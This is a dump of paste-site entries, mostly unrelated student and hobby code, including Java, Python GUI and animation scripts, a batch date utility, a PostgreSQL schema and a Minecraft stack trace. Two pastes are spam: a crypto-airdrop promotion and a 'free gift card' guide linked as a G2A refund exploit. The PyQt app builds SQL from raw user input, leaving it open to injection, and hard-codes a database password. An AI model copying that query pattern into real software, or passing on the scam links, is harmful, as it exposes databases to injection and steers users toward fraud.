id,title,username,language,date,content
fPUNkTib,FlowerShop,MladenKarachanov,Java,Friday 19th of January 2024 11:48:44 AM CDT,"package ProgrammingBasics2;

import java.util.Scanner;

public class FlowerShop {
    public static void main(String[] args) {
        Scanner scanner= new Scanner(System.in);
        int magnolias = Integer.parseInt(scanner.nextLine());
        int hyacinths = Integer.parseInt(scanner.nextLine());
        int roses = Integer.parseInt(scanner.nextLine());
        int cacti = Integer.parseInt(scanner.nextLine());
        double aGift = Double.parseDouble(scanner.nextLine());
        double sum = (magnolias*3.25)+(hyacinths*4.00)+(roses*3.50)+(cacti*8.00);
        double taxes = sum*0.05;
        double result = sum-taxes;
        if(aGift <= result){
            double diff = Math.abs(aGift-result);
        System.out.printf(""She is left with %.0f leva."",Math.floor(diff));
        }else{
            double diff1=Math.abs(aGift-result);
            System.out.printf(""She will have to borrow %.0f leva."",Math.ceil(diff1));
        }

    }
}
"
Xbe8qVCK,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Friday 19th of January 2024 11:44:25 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://net-drop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://net-drop.netlify.app/

218144"
Rt3pWr4k,# tk_bouncing_sq_RndColors.py,here2share,Python,Friday 19th of January 2024 11:44:00 AM CDT,"# tk_bouncing_sq_RndColors.py

import tkinter as tk
import random

ww = 1000
hh = 300

# Create the main window
window = tk.Tk()
window.geometry(f""{ww}x{hh}+0+0"")
window.title(""Bouncing Square Random Colors"")

# Create the canvas
canvas = tk.Canvas(window, width=ww, height=hh)
canvas.pack()

# Set up variables
dy = 20
dx = 20
x1 = 0
y1 = 0

# Function to handle the animation
def animate():
    global x1, y1, dx, dy

    x1 = x1 + dx
    y1 = y1 + dy
    x2 = x1 + 100
    y2 = y1 + 100

    if x1 < 0:
        dx = -1 * dx
    if y1 < 0:
        dy = -1 * dy
    if x1 > ww-100:
        dx = -1 * dx
    if y1 > hh-100:
        dy = -1 * dy

    color = ""#{:06x}"".format(random.randint(0, 0xffffff))

    canvas.delete(""square"")
    canvas.create_rectangle(x1, y1, x2, y2, fill=color, tags=""square"")

    window.after(100, animate)

# Call the animate function to start the animation
animate()

# Run the main loop
window.mainloop()"
yEe2DVk0,EconomyShopGUI-Premium v5.6.3 - FireworkOptions,C4BR3R4,YAML,Friday 19th of January 2024 11:30:38 AM CDT,"Could not pass event InventoryCloseEvent to EconomyShopGUI-Premium v5.6.3
java.lang.ClassCastException: class org.bukkit.craftbukkit.v1_20_R2.inventory.CraftInventoryCustom cannot be cast to class me.gypopo.economyshopgui.inventorys.editor.items.FireworkOptions (org.bukkit.craftbukkit.v1_20_R2.inventory.CraftInventoryCustom is in unnamed module of loader java.net.URLClassLoader @5a10411; me.gypopo.economyshopgui.inventorys.editor.items.FireworkOptions is in unnamed module of loader 'EconomyShopGUI-Premium-5.6.3.jar' @70111dcf)
	at me.gypopo.economyshopgui.methodes.ItemEditor.saveFireworkOptions(ItemEditor.java:71) ~[EconomyShopGUI-Premium-5.6.3.jar:?]
	at me.gypopo.economyshopgui.events.MenuHandler.onMenuClose(MenuHandler.java:901) ~[EconomyShopGUI-Premium-5.6.3.jar:?]
	at com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor1156.execute(Unknown Source) ~[?:?]
	at org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77) ~[paper-api-1.20.2-R0.1-SNAPSHOT.jar:?]
	at co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:81) ~[paper-api-1.20.2-R0.1-SNAPSHOT.jar:git-Paper-318]
	at org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70) ~[paper-api-1.20.2-R0.1-SNAPSHOT.jar:?]
	at io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54) ~[paper-1.20.2.jar:git-Paper-318]
	at io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:126) ~[paper-1.20.2.jar:git-Paper-318]
	at org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:615) ~[paper-api-1.20.2-R0.1-SNAPSHOT.jar:?]
	at org.bukkit.craftbukkit.v1_20_R2.event.CraftEventFactory.handleInventoryCloseEvent(CraftEventFactory.java:1680) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.handleContainerClose(ServerGamePacketListenerImpl.java:2866) ~[?:?]
	at net.minecraft.server.network.ServerGamePacketListenerImpl.handleContainerClose(ServerGamePacketListenerImpl.java:2859) ~[?:?]
	at net.minecraft.network.protocol.game.ServerboundContainerClosePacket.handle(ServerboundContainerClosePacket.java:15) ~[?:?]
	at net.minecraft.network.protocol.game.ServerboundContainerClosePacket.a(ServerboundContainerClosePacket.java:10) ~[?:?]
	at net.minecraft.network.protocol.PacketUtils.lambda$ensureRunningOnSameThread$0(PacketUtils.java:53) ~[?:?]
	at net.minecraft.server.TickTask.run(TickTask.java:18) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.util.thread.BlockableEventLoop.doRunTask(BlockableEventLoop.java:153) ~[?:?]
	at net.minecraft.util.thread.ReentrantBlockableEventLoop.doRunTask(ReentrantBlockableEventLoop.java:24) ~[?:?]
	at net.minecraft.server.MinecraftServer.doRunTask(MinecraftServer.java:1324) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.server.MinecraftServer.d(MinecraftServer.java:193) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.util.thread.BlockableEventLoop.pollTask(BlockableEventLoop.java:126) ~[?:?]
	at net.minecraft.server.MinecraftServer.pollTaskInternal(MinecraftServer.java:1301) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.server.MinecraftServer.pollTask(MinecraftServer.java:1294) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.util.thread.BlockableEventLoop.managedBlock(BlockableEventLoop.java:136) ~[?:?]
	at net.minecraft.server.MinecraftServer.waitUntilNextTick(MinecraftServer.java:1272) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1160) ~[paper-1.20.2.jar:git-Paper-318]
	at net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:315) ~[paper-1.20.2.jar:git-Paper-318]
	at java.lang.Thread.run(Unknown Source) ~[?:?]"
zqztnrSG,G2A.com Free Gift Card Guide Jan 2024,ounnuo,GetText,Friday 19th of January 2024 11:06:45 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_859596.pdf
 
Working as of
19 January 2024"
tXberP3z,change,SaNik74,C#,Friday 19th of January 2024 10:54:04 AM CDT,"class Program
{
    static void Main(string[] args)
    {
        string name = ""Torvalds"";
        string surname = ""Linus"";
        string tempName;

        Console.WriteLine($""{name} {surname}"");

        tempName = surname;
        surname = name;
        name = tempName;

        Console.WriteLine($""{name} {surname}"");
    }
}"
9BinGGKD,utility2.bat,GlobalAccessSoftware,Batch,Friday 19th of January 2024 10:45:52 AM CDT,"

  :::::::::::::::::::::
  :::  RC9 Update!  :::
  :::::::::::::::::::::

  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: utility2.bat custom by -JpE- 202307170943  :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  :::   :::   :::   :::   /\   :::   :::   :::   :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: Design Notes For Day of Week as Word:      :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: Old Farmers Need these 3 vars to work with :::
  ::: PLus the 3 tables to get dow, key, century :::
  ::: ========================================== :::
  ::: Last two of year / 4 + Last 2 of year +    :::
  ::: Day of Month + Month code & century code   :::
  ::: (for 2000 thru 2099 add 1) pre 1900 add 2  :::
  ::: pre 1800 add 2 more & Divide sum by 7.     :::
  ::: REMAINDER is day of the week; Sunday == 1  :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: This ^ Formula is Crucial In The ^ Coding! :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/ :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::
  ::: Rev8.6.7:  NEW FEATURES AND FIXES          :::
  ::: if dateToLookup string is passed in, then  :::
  ::: the year must be 10 digits with this       :::
  ::: NOTE: RC9 Allows years up to 2,147,483,647 :::
  ::: format: date2Lookup=""1923-01-09""           :::
  ::: If the 2nd arg isn't sent in the call,     :::
  ::: then it goes with RIGHT THIS MILLISECOND!  :::
  ::::::::::::::::::::::::::::::::::::::::::::::::::

    ::::::::::::::::::::::::::::::::::::::::::::::::::
    ::: JAFO: Get day of week for date as a word!  :::
    ::::::::::::::::::::::::::::::::::::::::::::::::::


    if not defined vers set vers=v8.7.0.16 20240117073112 by -JpE-
    if not defined testwell set /a testwell=1
    if not defined util2 set util2=""%bats%\utility2.bat""
    if not defined util3 set util3=""%bats%\utility3.bat""
  

:dowword <string weekdayVar2Return, string dateToLookupOptional>
  setlocal & set ""weekday=%~1"" & set ""date1=%~2""
  if not defined date1 set /a year4=(%date:~0,4%)

      if not defined date1 call :fetch year2 month day
      ::: Either or, never neither ^v nor.
      if defined date1 call :parsedate %date1% year4 year2 month day
      set /a ly=9 & call :monthkey key %month% %year4%

    if %key% gtr 99 set /a ly=0 & set /a key-=100
    ::: REM if %ly% equ 0 echo . & echo It is LeapYear! & echo .
    set /a sum1=(%year2% / 4 + %year2%)
    set /a sum2=(%sum1% + %day% + %key%)
      call :century %year4% adj

        ::: Mod:Fix ::: if Leap Year but before Leap Day!
        ::: v8.7.0.15 20240117073112 by -JpE-
        if %ly% equ 0 if %month% lss 3 set /a adj-=1

  if %adj% lss 9 set /a sum2=(%sum2%+%adj%)
  if %adj% equ 9 set ""weekday=Y10k Problem""
  if %adj% gtr 9 set /a key=7
  if %adj% neq 7 set /a dowk=(%sum2% %% 7%)

    if %key% neq 7 call :getdow %dowk% weekday
      if %key% equ 7 set ""weekday=ERROR-47c""
        if %key% equ 7 call :errr

  endlocal & set ""%~1=%weekday%""
  exit /b %errorlevel%

  
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::: Adapted month and day if year is more than 4 digits. -ed
::: fix Y10k, Y100k, Y100k, Y1mk, etc.
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::: If date string was passed in parse it to get
::: the 4 vars year4, year2, month, day; my way.
::: Mod: if more than a 4 digit year and make scalable.
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:parsedate <string datePassedIn, int year4Returned, int year2Returned, int monthReturned, int dayReturned>
  setlocal & set ""date1=%~1"" & set ""y4=%~2""
  set ""y2=%~3"" & set ""mo=%~4"" & set ""dy=%~5""
  if exist %util3% call %util3% datelen :strlen %date1%

      set /a len=(%datelen%-6)
      set /a l2=(%len%-2)
      set /a admo=(%len%+1)
      set /a addy=(%len%+4)
 
  ::: How long is just the Year string in characters?
  if %datelen% equ 10 (
    set /a ""y4=%date1:~0,4%""
    set /a ""y2=%date1:~2,2%""
    set ""mo=%date1:~5,2%""
    set ""dy=%date1:~8,2%""
  )
  if %datelen% gtr 10 (
    REM setlocal EnableExtensions
    REM setlocal EnableDelayedExpansion
      set y4=!date1:~0,%len%!
      set y2=!date1:~%l2%,2!
if %testwell% gtr 3 echo . & echo now testing over 4 digit years. And l2 == %l2% & echo . & pause & echo .
    set mo=!date1:~%admo%,2!
    set dy=!date1:~%addy%,2!
    REM setlocal DisableDelayedExpansion
  )
if %testwell% gtr 3 echo . & echo parsedate: y4 == %y4%, y2 == %y2%, admo == %admo%, addy == %addy%
if %testwell% gtr 3 echo len == %len%, mo == %mo%, dy == %dy% & echo .
  if ""%mo:~0,1%"" equ "" "" set /a ""mo=%mo:~1,1%""
  if ""%mo:~0,1%"" equ """" set /a ""mo=%mo:~1,1%""
  if ""%mo:~0,1%"" equ ""0"" set /a ""mo=%mo:~1,1%""
  if ""%dy:~0,1%"" equ "" "" set /a ""dy=%dy:~1,1%""
  if ""%dy:~0,1%"" equ """" set /a ""dy=%dy:~1,1%""
  if ""%dy:~0,1%"" equ ""0"" set /a ""dy=%dy:~1,1%""
  
if %testwell% gtr 3 echo . & echo ok here: y4 == %y4%, y2 == %y2%
if %testwell% gtr 3 echo mo == %mo%, dy == %dy% & echo . & pause & echo .

  endlocal & set ""%~2=%y4%"" & set ""%~3=%y2%"" & set ""%~4=%mo%"" & set ""%~5=%dy%""
  exit /b %errorlevel%


:::::::::::::::::::[ Begin The Century Group ]:::::::::::::::::::

:century <string year4, int adjWeThink>
  setlocal & set /a ""yr4=%~1""
  if %yr4% lss 0 echo overload & if exist %util3% call %util3% t :overload 0
  if %yr4% gtr 2147483646 echo overload & if exist %util3% call %util3% t :overload 0
    set /a millenium=%yr4:~0,1%
    set /a century=%yr4:~1,1%
    ::: IF year is over 4 digits long?
      if %yr4% gtr 9999 call :y10k
    ::: then alter this ^ millenium and century accordingly, same namespace.
    set /a evenm=(%millenium% %% 2%)
    set /a evenc=(%century% %% 2%)
  if %century% gtr 7 set /a century=(%century%-8)
  if %century% lss 8 if %century% gtr 3 set /a century=(%century%-4)
  if %evenm% leq 0 (
    if %century% equ 3 set /a adj=0
    if %century% equ 2 set /a adj=2
    if %century% equ 1 set /a adj=4
    if %century% equ 0 set /a adj=-1)
  if %evenm% gtr 0 (
    if %century% equ 3 set /a adj=4
    if %century% equ 2 set /a adj=-1
    if %century% equ 1 set /a adj=0
    if %century% equ 0 set /a adj=2)
  if %yr4% lss 1753 set /a adjust=9 & echo . & echo Results for years before 1753 weren't gregorian.
  if %yr4% leq 6000 if %yr4% gtr 2100 call :crosscheck
  REM if %yr4% leq 6000 if %yr4% gtr 2100 if %testwell% gtr 0 call :crosscheck
if %testwell% gtr 3  echo done1 and adj == %adj% & echo . & pause & echo .
  endlocal & set ""%~2=%adj%""
  exit /b %errorlevel%


::: In this case, yr4 is not the lookup it is just the YEAR.
::: Handles years up to 2,147,483,647 A.D.
:y10k
if %testwell% gtr 3 echo inside y10k now. & pause
  if %yr4% gtr 2147483000 echo Uh Oh!

    ::: NEAR FATAL Error x2! Begin Again fixes it fine! :::
    if %yr4% gtr 2147483646 echo overload & if exist %util3% call %util3% t :overload 0
    if %yr4% leq 0 echo overload & if exist %util3% call %util3% t :overload 0
::: 
  if exist %util3% call %util3% lenstr :strlen %yr4%
if %testwell% gtr 3 echo .& echo y10k: The length of %yr4% is %lenstr%. & echo .
 REM & pause & echo .
  set /a m2=(%lenstr%-3)
if %testwell% gtr 3 echo y10k pause, lenstr == %lenstr%, and m2 == %m2% & echo . & pause
  REM setlocal EnableExtensions
    REM setlocal EnableDelayedExpansion
      set /a millenium=(!yr4:~0,%m2%!)
      set /a century=(!yr4:~%m2%,1!)
    REM setlocal DisableDelayedExpansion
  REM setlocal DisableExtensions
if %testwell% gtr 3 echo . & echo Y0k: millenium == %millenium%, century == %century% & echo . & pause & echo .
  exit /b %errorlevel%


:crosscheck
  set crosschecker=""%bats%\crosschecker.bat""
  if exist %crosschecker% call %crosschecker%
  echo . & echo That checks out. & echo .
  exit /b %errorlevel%

:::::::::::::::::::[ End of The Century Group ]:::::::::::::::::::


:monthkey <int keyReturned, int monthNum, int year>
  setlocal & set /a num=%~2 & set /a year=%~3
  if %num% equ 1 set /a key=1
  if %num% equ 10 set /a key=1
  if %num% equ 2 set /a key=4
  if %num% equ 3 set /a key=4
  if %num% equ 11 set /a key=4
      ::: If mod equ 0 then it's a Leapyear, evenly divisible by 4.
      REM set /a mod=%year:~0,4% %% 4% 
    REM if %mod% neq 0 
    if %num% equ 4 set /a key=0
    REM if %mod% neq 0 
    if %num% equ 7 set /a key=0
  if %num% equ 5 set /a key=2
  if %num% equ 6 set /a key=5
  if %num% equ 7 set /a key=0
  if %num% equ 8 set /a key=3
  if %num% equ 9 set /a key=6
  if %num% equ 12 set /a key=6
      ::: Code it in as + a hundred if it's leapyear! :::
      REM if %mod% equ 0 if %num% neq 4 if %num% neq 7 set /a key+=100
      set /a mod=%year:~0,4% %% 4% 
      if %mod% equ 0 set /a key+=100
  endlocal & set ""%~1=%key%""
  exit /b %errorlevel%


::: Get day of week word from day number.
:getdow <int weekdayNum, string weekday2Return>
  setlocal & set /a ""dow=%~1""
  if %dow% equ 0 set /a dow=7
  if %dow% equ 1 set weekday=Sunday
  if %dow% equ 2 set weekday=Monday
  if %dow% equ 3 set weekday=Tuesday
  if %dow% equ 4 set weekday=Wednesday
  if %dow% equ 5 set weekday=Thursday
  if %dow% equ 6 set weekday=Friday
  if %dow% equ 7 set weekday=Saturday
  endlocal & set ""%~2=%weekday%""
  exit /b %errorlevel%


:fetch <int yearLast2, int monthNum, int dayOfMonth>
  setlocal
  set /a yearLast2=(%date:~2,2%)
  set ""monthNum=%date:~5,2%""
  if ""%monthNum:~0,1%"" equ "" "" set /a monthNum=(%monthNum:~1,1%)
  if ""%monthNum:~0,1%"" equ ""0"" set /a monthNum=(%monthNum:~1,1%)
  set ""dayOfMonth=%date:~8,2%""
  if ""%dayOfMonth:~0,1%"" equ "" "" set /a dayOfMonth=(%dayOfMonth:~1,1%)
  if ""%dayOfMonth:~0,1%"" equ ""0"" set /a dayOfMonth=(%dayOfMonth:~1,1%)
  endlocal & set ""%~1=%yearLast2%"" & set ""%~2=%monthNum%"" & set ""%~3=%dayOfMonth%""
  exit /b %errorlevel%


:errr
  setlocal
  echo . & echo Developmental CheckPoint!
  echo Enviromental Pollution. & echo .
  echo Something peculiar is amiss?
  echo . & pause & echo .
  endlocal
  exit /b %errorlevel%



  ::: 100% -JpE-


"
x5jCUzGs,ИСФРКТ БД,psychotrip,PostgreSQL,Friday 19th of January 2024 10:38:06 AM CDT,"CREATE DATABASE computer_repair_firm
    WITH
    OWNER = postgres
    ENCODING = 'UTF8'
    LC_COLLATE = 'Russian_Russia.1251'
    LC_CTYPE = 'Russian_Russia.1251'
    TABLESPACE = pg_default
    CONNECTION LIMIT = -1
    IS_TEMPLATE = False;

COMMENT ON DATABASE computer_repair_firm
    IS 'База данных информационной системы фирмы по ремонту компьютерной техники';


CREATE TABLE IF NOT EXISTS public.clients
(
    client_code integer NOT NULL DEFAULT nextval('clients_client_code_seq'::regclass),
    full_name character varying(255) COLLATE pg_catalog.""default"",
    address character varying(255) COLLATE pg_catalog.""default"",
    phone_number character varying(15) COLLATE pg_catalog.""default"",
    email character varying(255) COLLATE pg_catalog.""default"",
    CONSTRAINT clients_pkey PRIMARY KEY (client_code)
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.clients
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.component_order
(
    component_code integer NOT NULL,
    order_number integer NOT NULL,
    quantity integer,
    CONSTRAINT component_order_pkey PRIMARY KEY (component_code, order_number),
    CONSTRAINT component_order_component_code_fkey FOREIGN KEY (component_code)
        REFERENCES public.components (component_code) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT component_order_order_number_fkey FOREIGN KEY (order_number)
        REFERENCES public.orders (order_number) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT fk_component_order_components FOREIGN KEY (component_code)
        REFERENCES public.components (component_code) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT fk_component_order_orders FOREIGN KEY (order_number)
        REFERENCES public.orders (order_number) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.component_order
    OWNER to postgres;
    
    
CREATE TABLE IF NOT EXISTS public.components
(
    component_code integer NOT NULL DEFAULT nextval('components_component_code_seq'::regclass),
    name character varying(255) COLLATE pg_catalog.""default"",
    cost numeric(10,2),
    available_quantity integer,
    CONSTRAINT components_pkey PRIMARY KEY (component_code)
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.components
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.employee_order
(
    order_number integer NOT NULL,
    employee_id integer NOT NULL,
    CONSTRAINT employee_order_pkey PRIMARY KEY (order_number, employee_id),
    CONSTRAINT employee_order_employee_id_fkey FOREIGN KEY (employee_id)
        REFERENCES public.employees (employee_id) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT employee_order_order_number_fkey FOREIGN KEY (order_number)
        REFERENCES public.orders (order_number) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT fk_employee_order_employees FOREIGN KEY (employee_id)
        REFERENCES public.employees (employee_id) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.employee_order
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.employees
(
    employee_id integer NOT NULL DEFAULT nextval('employees_employee_id_seq'::regclass),
    full_name character varying(255) COLLATE pg_catalog.""default"",
    ""position"" character varying(255) COLLATE pg_catalog.""default"",
    phone_number character varying(15) COLLATE pg_catalog.""default"",
    CONSTRAINT employees_pkey PRIMARY KEY (employee_id)
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.employees
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.order_service
(
    order_number integer NOT NULL,
    service_code integer NOT NULL,
    quantity integer,
    CONSTRAINT order_service_pkey PRIMARY KEY (order_number, service_code),
    CONSTRAINT fk_order_service_orders FOREIGN KEY (order_number)
        REFERENCES public.orders (order_number) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT fk_order_service_services FOREIGN KEY (service_code)
        REFERENCES public.services (service_code) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT order_service_order_number_fkey FOREIGN KEY (order_number)
        REFERENCES public.orders (order_number) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION,
    CONSTRAINT order_service_service_code_fkey FOREIGN KEY (service_code)
        REFERENCES public.services (service_code) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.order_service
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.orders
(
    order_number integer NOT NULL DEFAULT nextval('orders_order_number_seq'::regclass),
    client_code integer,
    device_type character varying(255) COLLATE pg_catalog.""default"",
    status character varying(255) COLLATE pg_catalog.""default"",
    start_date date,
    problem_description text COLLATE pg_catalog.""default"",
    repair_description text COLLATE pg_catalog.""default"",
    repair_cost numeric(10,2),
    completion_date date,
    CONSTRAINT orders_pkey PRIMARY KEY (order_number),
    CONSTRAINT orders_client_code_fkey FOREIGN KEY (client_code)
        REFERENCES public.clients (client_code) MATCH SIMPLE
        ON UPDATE NO ACTION
        ON DELETE NO ACTION
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.orders
    OWNER to postgres;


CREATE TABLE IF NOT EXISTS public.services
(
    service_code integer NOT NULL DEFAULT nextval('services_service_code_seq'::regclass),
    name character varying(255) COLLATE pg_catalog.""default"",
    cost numeric(10,2),
    description text COLLATE pg_catalog.""default"",
    CONSTRAINT services_pkey PRIMARY KEY (service_code)
)

TABLESPACE pg_default;

ALTER TABLE IF EXISTS public.services
    OWNER to postgres;    "
diWg5RFM,ИСФРКТ Back,psychotrip,Python,Friday 19th of January 2024 10:34:34 AM CDT,"import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QComboBox, QLabel, QLineEdit, QPushButton, QWidget
from PyQt5.QtCore import QLocale
import psycopg2


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.init_ui()

    def init_ui(self):
        self.setWindowTitle('Информационная система менеджера фирмы по ремонту компьютерной техники')
        self.setGeometry(100, 100, 400, 200)

        # Установка русского языка для интерфейса
        locale = QLocale(QLocale.Russian, QLocale.Russia)
        locale.setDefault(locale)

        # Создание подключения к базе данных
        self.conn = psycopg2.connect(
            database=""computer_repair_firm"",
            user=""postgres"",
            password=""admin"",
            host=""localhost"",
            port=""5432""
        )

        # Словарь с соответствием русских и английских названий таблиц
        self.table_names = {
            'Заказы': 'orders',
            'Клиенты': 'clients',
            'Услуги_заказа': 'order_service',
            'Услуги': 'services',
            'Заказы_сотрудников': 'employee_order',
            'Сотрудники': 'employees',
            'Комплектующие_заказа': 'component_order',
            'Комплектующие': 'components'
        }

        # Словарь с атрибутами для каждой таблицы
        self.table_attributes = {
            'Заказы': ['client_code', 'device_type', 'status', 'start_date', 'problem_description',
                       'repair_description', 'repair_cost', 'completion_date'],
            'Клиенты': ['full_name', 'address', 'phone_number', 'email'],
            'Услуги_заказа': ['order_number', 'service_code', 'quantity'],
            'Услуги': ['name', 'cost', 'description'],
            'Заказы_сотрудников': ['order_number', 'employee_id'],
            'Сотрудники': ['full_name', 'position', 'phone_number'],
            'Комплектующие_заказа': ['component_code', 'order_number', 'quantity'],
            'Комплектующие': ['name', 'cost', 'available_quantity']
        }

        # Создание основного макета
        layout = QVBoxLayout()

        # Выбор таблицы с помощью комбо-бокса
        self.table_combo = QComboBox(self)
        self.table_combo.addItems(self.table_names.keys())
        self.table_combo.currentIndexChanged.connect(self.populate_fields)
        layout.addWidget(self.table_combo)

        # Создание макета для полей ввода
        self.input_layout = QVBoxLayout()
        layout.addLayout(self.input_layout)

        # Добавление кнопки для вставки данных
        insert_button = QPushButton('Вставить данные', self)
        insert_button.clicked.connect(self.insert_data)
        layout.addWidget(insert_button)

        # Создание центрального виджета и установка макета
        central_widget = QWidget(self)
        central_widget.setLayout(layout)
        self.setCentralWidget(central_widget)

    def populate_fields(self, index):
        # Очистка предыдущих виджетов ввода
        for i in reversed(range(self.input_layout.count())):
            widget = self.input_layout.itemAt(i).widget()
            if widget:
                widget.setParent(None)

        # Добавление виджетов ввода и соответствующих меток для выбранной таблицы
        table_name = self.table_combo.currentText()
        attributes = self.table_attributes[table_name]
        self.input_labels = []
        self.input_edits = []
        for attribute in attributes:
            label = QLabel(f""{attribute}:"")
            edit = QLineEdit()
            self.input_labels.append(label)
            self.input_edits.append(edit)
            self.input_layout.addWidget(label)
            self.input_layout.addWidget(edit)

    def insert_data(self):
        try:
            table_name_russian = self.table_combo.currentText()
            table_name_english = self.table_names[table_name_russian]

            # Подготовка SQL-запроса
            column_names = [attribute for attribute in self.table_attributes[table_name_russian]]
            columns = ', '.join(column_names)
            values = ', '.join([f""'{edit.text()}'"" for edit in self.input_edits])

            query = f""INSERT INTO {table_name_english} ({columns}) VALUES ({values});""

            # Выполнение запроса
            with self.conn.cursor() as cursor:
                cursor.execute(query)

            # Применение изменений
            self.conn.commit()

        except Exception as e:
            print(f""Ошибка: {e}"")
            self.conn.rollback()

        finally:
            # Очистка полей ввода
            for edit in self.input_edits:
                edit.clear()


def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()
"
rL9bbzwa,# t_chase.py *updated*,here2share,Python,Friday 19th of January 2024 10:17:58 AM CDT,"# t_chase.py *updated*

import turtle
import random

rainbow=[]
def z(r,g,b):
    rainbow.append((r,g,b))
r,g,b=255,0,0
for g in range(256):
    z(r,g,b)
for r in range(254, -1, -1):
    z(r,g,b)
for b in range(256):
    z(r,g,b)
for g in range(254, -1, -1):
    z(r,g,b)
for r in range(256):
    z(r,g,b)
for b in range(254, -1, -1):
    z(r,g,b)
Lc = len(rainbow)

n=300
ccc = Lc/(n+1)

screen = turtle.Screen()
screen.tracer(0,0)
screen.setup(600,600)
screen.title('Chase')
turtle.hideturtle()

chasers = []
for i in range(n):
    chasers.append(turtle.Turtle())

for i in range(n):
	c = '#%02x%02x%02x' % (rainbow[int(i*ccc)])
	chasers[i].up()
	chasers[i].color(c)
	chasers[i].goto(random.uniform(-500,500), random.uniform(-500,500))
chasers[n-1].goto(0,0)
chasers[n-1].shape('circle')
chasers[n-1].shapesize(1)

orbit=2
ppp = range(1,9)
ccc = 0

while 1:
	if ccc < 280:
		for i in range(n-1):
			angle = chasers[i].towards(chasers[i+1])
			chasers[i].seth(angle)
	zzz = chasers[n-1].pos()
	for z in zzz:
		if abs(z) > 200:
			angle = chasers[n-1].towards(0,0)
			chasers[n-1].seth(angle)
			orbit = random.choice(ppp)
	chasers[n-1].left(orbit)
	chasers[n-1].fd(10)
	for i in range(n-1):
		chasers[i].fd(10)
	ccc = ccc%300 + 1
	screen.update()"
SFR4hBvH,Untitled,Coder_228,C++,Friday 19th of January 2024 09:45:07 AM CDT,"/*
 * See documentation at https://nRF24.github.io/RF24
 * See License information at root directory of this library
 * Author: Brendan Doherty (2bndy5)
 */

/**
 * A simple example of sending data from 1 nRF24L01 transceiver to another.
 *
 * This example was written to be used on 2 devices acting as ""nodes"".
 * Use the Serial Monitor to change each node's behavior.
 */
#include <SPI.h>
#include ""printf.h""
#include ""RF24.h""

#define CE_PIN D4
#define CSN_PIN D2
// instantiate an object for the nRF24L01 transceiver
RF24 radio(CE_PIN, CSN_PIN);

// Let these addresses be used for the pair
uint8_t address[][6] = { ""1Node"", ""2Node"" };
// It is very helpful to think of an address as a path instead of as
// an identifying device destination

// to use different addresses on a pair of radios, we need a variable to
